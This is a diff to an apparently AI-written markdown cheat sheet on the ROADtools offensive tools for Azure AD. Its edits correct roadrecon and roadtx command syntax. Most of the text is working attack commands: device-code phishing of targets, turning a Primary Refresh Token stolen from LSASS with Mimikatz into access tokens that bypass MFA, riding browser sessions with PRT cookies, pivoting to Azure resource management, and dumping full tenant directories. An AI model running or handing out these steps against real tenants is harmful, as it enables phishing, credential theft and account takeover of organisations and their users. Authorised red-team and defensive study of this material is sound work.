@@ -47,37 +47,28 @@ roadrecon auth --prt-cookie <cookie> --prt-sessionkey <hex-key>
 ### Data Collection
 
 ```bash
-# Gather everything — users, groups, roles, devices, apps, service principals, policies
+# Gather everything from the Azure AD Graph — users, groups, roles, devices,
+# apps, service principals, CA policies. gather does NOT take per-object flags
+# (no --users/--groups); it collects the full set and auto-reads .roadtools_auth.
 roadrecon gather
+roadrecon gather -d /tmp/tenant.db      # output to a custom SQLite DB
 
-# Gather only specific objects
-roadrecon gather --users
-roadrecon gather --groups
-roadrecon gather --devices
-roadrecon gather --applications
-roadrecon gather --servicePrincipals
-roadrecon gather --policies
-
-# Use a specific token file
-roadrecon gather --tokens .roadtools_auth
-
-# Output to custom DB file
-roadrecon gather -d /tmp/tenant.db
+# Companion collectors (separate subcommands, not flags):
+roadrecon azgather                      # Azure Resource Manager (subscriptions/resources/RBAC)
+roadrecon pimgather                     # PIM eligible role assignments
+roadrecon gatherall                     # Graph + MS Graph + more, in one pass
 ```
 
 ### Browse & Query
 
 ```bash
-# Launch web UI (browse at http://127.0.0.1:5000)
+# Launch the web UI (browse at http://127.0.0.1:5000) — this is how you view/query data.
+# There is NO `roadrecon dump` subcommand; use the GUI or query roadrecon.db directly.
 roadrecon gui
-roadrecon gui -d /tmp/tenant.db    # specify DB file
+roadrecon gui -d /tmp/tenant.db         # specify DB file
 
-# CLI dump to JSON
-roadrecon dump --users
-roadrecon dump --groups
-roadrecon dump --servicePrincipals
-roadrecon dump --applications
-roadrecon dump --conditionalAccessPolicies
+# Query the SQLite DB directly for scripted extraction
+sqlite3 roadrecon.db "SELECT displayName, userPrincipalName FROM Users;"
 
 # Plugin: generate BloodHound-compatible output
 roadrecon plugin bloodhound
@@ -104,25 +95,21 @@ roadtx handles OAuth flows, PRT abuse, device code phishing, and token refresh/c
 
 ### Get Tokens
 
+> [!note] roadtx has **40+ auth subcommands** — run `roadtx -h` for the full list. Interactive and device-code auth are their **own subcommands** (`interactiveauth`), while `gettokens` handles refresh-token / resource / client-switch work.
+
 ```bash
-# Interactive browser
-roadtx gettokens --tenant <tenant-id>
+# Interactive (Selenium browser) and device-code phishing — the interactiveauth subcommand
+roadtx interactiveauth -t <tenant-id> -u user@company.com -p 'Password123!'
+roadtx interactiveauth -t <tenant-id> --device-code
+# Device code: give the target "microsoft.com/devicelogin + code"; roadtx polls & saves the token
 
-# Device code phishing — outputs a code for the target to enter
-roadtx gettokens --device-code --tenant <tenant-id>
-# Give target: "Go to microsoft.com/devicelogin and enter: ABCD-EFGH"
-# roadtx polls and saves token when they authenticate
+# Request a token for a specific resource/scope (-r/--resource, -s/--scope)
+roadtx gettokens -r https://graph.microsoft.com
+roadtx gettokens -s https://outlook.office.com/.default     # Exchange
+roadtx gettokens -s https://management.azure.com/.default   # Azure ARM
 
-# Username + password (no MFA — managed tenants)
-roadtx gettokens -u user@company.com -p 'Password123!'
-
-# Request token for specific resource/scope
-roadtx gettokens --scope https://graph.microsoft.com/.default
-roadtx gettokens --scope https://outlook.office.com/.default    # Exchange
-roadtx gettokens --scope https://management.azure.com/.default  # Azure ARM
-
-# Refresh an existing token
-roadtx gettokens --refresh-token <token> --scope <scope>
+# Refresh an existing token into a new one
+roadtx gettokens --refresh-token <token> -r https://graph.microsoft.com
 ```
 
 ### PRT Abuse
@@ -130,26 +117,24 @@ roadtx gettokens --refresh-token <token> --scope <scope>
 PRTs are long-lived tokens on Azure AD-joined devices. Steal with Mimikatz (`sekurlsa::cloudap`), then use roadtx to convert to access tokens — no MFA required.
 
 ```bash
-# Convert stolen PRT to access token
-roadtx gettokens \
-  --prt <base64-prt> \
-  --prt-sessionkey <hex-session-key> \
-  --tenant <tenant-id>
-
-# Get tokens for a specific resource using PRT
-roadtx gettokens \
-  --prt <base64-prt> \
-  --prt-sessionkey <hex-session-key> \
-  --scope https://graph.microsoft.com/.default
-
-# Generate a PRT cookie for browser use
+# Convert a stolen PRT (+ session key) into access tokens — this is `prtauth`, NOT gettokens
 roadtx prtauth \
   --prt <base64-prt> \
-  --prt-sessionkey <hex-session-key>
-# Sets x-ms-RefreshTokenCredential cookie — use in browser to get session
+  --prt-sessionkey <hex-session-key> \
+  -r https://graph.microsoft.com -t <tenant-id>
 
-# Get PRT from LSASS via roadtx (requires access to Windows DPAPI keys)
-roadtx decrypt-prt --prt-blob <blob> --dpapi-key <key>
+# Tokens for a specific resource using the PRT
+roadtx prtauth \
+  --prt <base64-prt> \
+  --prt-sessionkey <hex-session-key> \
+  -s https://management.azure.com/.default
+
+# Browser SSO from a PRT cookie (ride the session in a real browser)
+roadtx browserprtauth --prt-cookie <x-ms-RefreshTokenCredential>
+#   generate the cookie itself with `roadtx prtcookie`; request a fresh PRT with `roadtx prt`
+
+# Decrypt a PRT/response blob — the subcommand is `decrypt` (there is no decrypt-prt)
+roadtx decrypt -f <prt-file> --prt-sessionkey <hex-key>
 ```
 
 ### Refresh Token Abuse
@@ -197,10 +182,10 @@ curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configura
 curl -s "https://login.microsoftonline.com/common/userrealm/?user=test@<domain>&api-version=1.0" | jq '{type:.NameSpaceType}'
 
 # 2. Start device code phish
-roadtx gettokens --device-code --scope https://graph.microsoft.com/.default
+roadtx interactiveauth --device-code -r https://graph.microsoft.com
 # Send the user_code to target via phishing
 
-# 3. When token received, gather all tenant data
+# 3. When token received, gather all tenant data (auto-reads .roadtools_auth)
 roadrecon gather
 
 # 4. Browse data
@@ -215,15 +200,15 @@ roadrecon gui
 # sekurlsa::cloudap
 
 # Convert PRT to Graph token (Kali)
-roadtx gettokens --prt <prt> --prt-sessionkey <key> \
-  --scope https://graph.microsoft.com/.default
+roadtx prtauth --prt <prt> --prt-sessionkey <key> \
+  -r https://graph.microsoft.com
 
-# Use token to enumerate
-roadrecon gather --tokens .roadtools_auth
+# Use token to enumerate (gather auto-reads .roadtools_auth)
+roadrecon gather
 
 # Convert PRT to Azure ARM token (pivot to Azure resources)
-roadtx gettokens --prt <prt> --prt-sessionkey <key> \
-  --scope https://management.azure.com/.default
+roadtx prtauth --prt <prt> --prt-sessionkey <key> \
+  -s https://management.azure.com/.default
 ```
 
 ---
@@ -238,6 +223,10 @@ roadtx gettokens --prt <prt> --prt-sessionkey <key> \
 
 ---
 
+> [!note] **Related tooling** — the PowerShell counterpart is [[Tools/Cloud/AADInternals|AADInternals]] (PTA/AD-Connect attacks it doesn't cover); FOCI/refresh-token swapping overlaps [[Tools/Cloud/TokenTactics|TokenTactics]]; feed `roadrecon plugin bloodhound` output into [[Tools/AD/BloodHound|BloodHound]].
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
